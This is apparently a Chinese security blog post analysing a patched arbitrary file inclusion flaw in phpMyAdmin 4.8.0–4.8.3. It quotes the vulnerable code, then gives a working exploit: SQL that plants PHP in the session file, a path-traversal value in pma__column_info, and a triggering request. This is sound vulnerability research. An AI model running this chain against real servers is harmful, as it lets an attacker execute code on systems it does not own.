---
title: "Phpmyadmin4.8.0~4.8.3任意文件包含"
date: 2018-12-20T08:34:43+08:00
categories: ['代码审计']
tags: ['phpmyadmin','include']
---

2018年12月7日，phpmyadmin官方发布[公告](https://www.phpmyadmin.net/security/PMASA-2018-6/)修复了一个由`Transformation`特性引起的任意文件包含漏洞。<!--more-->

## 漏洞分析

`Transformation`是phpMyAdmin中的一个高级功能，通过`Transformation`可以对每个字段的内容使用不同的转换，每个字段中的内容将被预定义的规则所转换。比如我们有一个存有文件名的字段`Filename`，正常情况下 phpMyAdmin 只会将路径显示出来。但是通过`Transformation`我们可以将该字段转换成超链接，我们就能直接在 phpMyAdmin 中点击并在浏览器的新窗口中看到这个文件。

通常情况下Transformation的规则存储在每个数据库的`pma__column_info`表中，而在phpMyAdmin 4.8.0~4.8.3版本中，由于对转换参数处理不当，导致了任意文件包含漏洞的出现。

这些转换在phpMyAdmin的`column_info`表中定义，他通常已经存在于phpMyAdmin的系统表中。但是每个数据库都可以生成自己的版本。要为特定数据库生成phpmyadmin系统表，可以这样生成

```http
http://phpmyadmin/chk_rel.php?fixall_pmadb=1&db=*yourdb*
```

它将会创建一个`pma__*`表的集合到你数据库中。

说了这么多，我们来看下具体产生漏洞的代码`tbl_replace.php`

```php
<?php

$mime_map = Transformations::getMIME($GLOBALS['db'], $GLOBALS['table']);
[省略]
// Apply Input Transformation if defined
if (!empty($mime_map[$column_name])
&& !empty($mime_map[$column_name]['input_transformation'])
) {
   $filename = 'libraries/classes/Plugins/Transformations/'
. $mime_map[$column_name]['input_transformation'];
   if (is_file($filename)) {
      include_once $filename;
      $classname = Transformations::getClassName($filename);
      /** @var IOTransformationsPlugin $transformation_plugin */
      $transformation_plugin = new $classname();
      $transformation_options = Transformations::getOptions(
         $mime_map[$column_name]['input_transformation_options']
      );
      $current_value = $transformation_plugin->applyTransformation(
         $current_value, $transformation_options
      );
      // check if transformation was successful or not
      // and accordingly set error messages & insert_fail
      if (method_exists($transformation_plugin, 'isSuccess')
&& !$transformation_plugin->isSuccess()
) {
         $insert_fail = true;
         $row_skipped = true;
         $insert_errors[] = sprintf(
            __('Row: %1$s, Column: %2$s, Error: %3$s'),
            $rownumber, $column_name,
            $transformation_plugin->getError()
         );
      }
   }
}
```

拼接到`$filename`的变量`$mime_map[$column_name]['input_transformation']`来自于数据表`pma__column_info`中的`input_transformation`字段，因为数据库中的内容用户可控，从而产生了任意文件包含漏洞。

## 漏洞利用

1. 创建一个新的数据库`foo`和一个随机的`bar`表，在表中创建一个`baz`字段，然后把我们的php代码写入session
```sql
CREATE DATABASE foo;
CREATE TABLE foo.bar ( baz VARCHAR(255) PRIMARY KEY );
INSERT INTO foo.bar SELECT '<?php phpinfo() ?>';
```

2. 创建phpmyadmin系统表在你的`foo`数据库中

    ```http
    http://phpmyadmin/chk_rel.php?fixall_pmadb=1&db=foo
    ```

3. 将篡改后的`Transformation`数据插入表`pma__columninfo`中：将`yourSessionId`替换成你的会话ID，即COOKIE中phpMyAdmin的值
    ```sql
      INSERT INTO `pma__column_info`SELECT '1', 'foo', 'bar', 'baz', 'plop',
    'plop', 'plop', 'plop',
    '../../tmp/sess_{yourSessionId}','plop';
    ```

4.  然后访问

    ```http
    http://phpmyadmin/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1
    ```
	如果利用成功，则会返回`phpinfo();`